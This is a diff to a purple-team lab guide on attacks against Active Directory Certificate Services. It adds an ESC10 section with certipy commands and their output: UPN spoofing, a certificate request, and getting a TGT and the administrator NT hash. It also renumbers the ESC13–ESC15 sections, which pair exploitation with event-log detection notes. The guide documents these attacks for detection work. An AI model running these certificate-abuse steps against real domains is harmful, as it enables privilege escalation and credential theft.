@@ -674,10 +674,87 @@ PS C:\Users\Administrator> Set-AuditRule -AdObjectPath 'AD:\CN=Users,DC=purplete
 
 Now any changes of the UserPrincipalName attribute for any user account should be logged.
 
+# 11. ESC10 
 
-# 11. ESC13
+## 11.1 Configure the CA to be vulnerable
 
-## 11.1 Setup the environment to be vulnerable to an ESC13 attack
+This is more or less the same thing as an ESC9 exploitation but there is the needs to have either one of those condition meets : 
+- StrongCertificateBindingEnforcement set to 0 (Disabled) 
+- CertificateMappingMethods contains UPN flag
+
+![ESC10_configuration.jpg](ESC10/ESC10_configuration.jpg)
+
+## 11.2 Exploitation
+
+- Modify the victim upn attribute to administrator
+```
+└─$ certipy account update -username "attacker@purpleteam.local" -p '1attacker*' -user victim -upn administrator
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: PURPLETEAM.LOCAL.
+[!] Use -debug to print a stacktrace
+[*] Updating user 'victim':
+    userPrincipalName                   : administrator
+[*] Successfully updated 'victim'
+```
+
+- Request a certificate using the User template
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ certipy req -username "victim@purpleteam.local" -hashes '426b549fe65d8fca40c950331006af8c' -target 172.16.0.1 -ca 'DC01-CA' -template 'USER'
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: PURPLETEAM.LOCAL.
+[!] Use -debug to print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID is 57
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator'
+[*] Certificate object SID is 'S-1-5-21-2903762927-2752062241-1101764633-1116'
+[*] Saving certificate and private key to 'administrator.pfx'
+File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+
+- Undone the UPN attribute modification
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ certipy account update -username "attacker@purpleteam.local" -p '1attacker*' -user victim -upn victim@purpleteam.local
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: PURPLETEAM.LOCAL.
+[!] Use -debug to print a stacktrace
+[*] Updating user 'victim':
+    userPrincipalName                   : victim@purpleteam.local
+[*] Successfully updated 'victim'
+```
+
+- Use the certificate to get a TGT for the built-in Administrator account
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ certipy auth -pfx administrator.pfx -domain purpleteam.local -dc-ip 172.16.0.1 
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator'
+[*]     Security Extension SID: 'S-1-5-21-2903762927-2752062241-1101764633-1116'
+[*] Using principal: 'administrator@purpleteam.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@purpleteam.local': aad3b435b51404eeaad3b435b51404ee:aae723d86a44672c3e7868e441f92f02
+```
+
+## 11.3 ADCS event logs
+
+This attack generate the same log as the ESC9.
+
+# 12. ESC13
+
+## 12.1 Setup the environment to be vulnerable to an ESC13 attack
 
 1. Create a Universal Group
 
@@ -703,7 +780,7 @@ For the **msDS-OIDToGroupLink**, the value to put is the DN of a group that will
 Then I can just allow it to be enrolled by any domain users & publish this certificate template.
 
 
-## 11.2 Exploitation
+## 12.2 Exploitation
 
 1. Request the vulnerable template
 ```
@@ -772,7 +849,7 @@ File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will sav
 [*] NT hash for 'Administrator': aae723d86a44672c3e7868e441f92f02
 ```
 
-## 11.3 ADCS event logs
+## 12.3 ADCS event logs
 
 Unfortunatly, the ADCS related logs are not really pertinent for a detection point of view : 
 ```
@@ -786,9 +863,9 @@ SKI:		d7 61 a4 af d7 4e 51 50 ef 24 65 a7 33 c5 83 22 b6 93 09 13
 Subject:	E=attacker@purpleteam.local, CN=attacker, CN=Users, DC=purpleteam, DC=local
 ```
 
-# 12 ESC14 - Scenario B
+# 13 ESC14 - Scenario B
 
-## 12.1 Setup a vulnerable configuration
+## 13.1 Setup a vulnerable configuration
 
 ### Certificate configuration
 
@@ -810,7 +887,7 @@ To be able to exploit the ESC14 B scenario, the StrongCertificateBindingEnforcem
 To do so, we need to modify the altSecurityIdentities attribute of victimESC14.
 ![ESC14-B-WeakExplicitMapping.jpg](ESC14/ESC14-B-WeakExplicitMapping.jpg)
 
-## 12.2 Exploitation
+## 13.2 Exploitation
 
 1. Ensure that there victimESC14 account has a weak explicit mapping setup
 ```
@@ -862,7 +939,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Got hash for 'victimesc14@purpleteam.local': aad3b435b51404eeaad3b435b51404ee:129bc7e8c675bb6014f18aef918c98d5
 ```
 
-## 12.3 Event Logs
+## 13.3 Event Logs
 
 1. 4887 
 ![ESC14-B_4887.jpg](ESC14/ESC14-B_4887.jpg)
@@ -882,14 +959,14 @@ PS C:\Users\Administrator> Get-ADObject -LDAPFilter "(lDAPDisplayName=mail)" -Se
 PS C:\Users\Administrator> Set-AuditRule -AdObjectPath 'AD:\CN=Users,DC=purpleteam,DC=local' -WellKnownSidType WorldSid -Rights WriteProperty -InheritanceFlags Children -AttributeGUID bf967961-0de6-11d0-a285-00aa003049e2 -AuditFlags Success
 ```
 
-# 13. ESC15
+# 14. ESC15
 
-## 13.1 Create a vulnerable template 
+## 14.1 Create a vulnerable template 
 
 Modify the WebServer built-in template and add, under the security tab, the right for the attacker user to read & enroll the certificate.
 ![ESC15_configuration.jpg](ESC15/ESC15_configuration.jpg)
 
-## 13.2 Exploitation 
+## 14.2 Exploitation 
 
 1. Request a certificate with the Client Request Agent application policy
 ```
@@ -925,7 +1002,7 @@ File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save w
 [*] Wrote certificate and private key to 'administrator_173a1264-71ca-4757-8255-ac73541f2fdd.pfx'
 ```
 
-## 13.3 ADCS event logs
+## 14.3 ADCS event logs
 
 For the first step there is an interesting 4886 & 4887 : 
 1. 4886
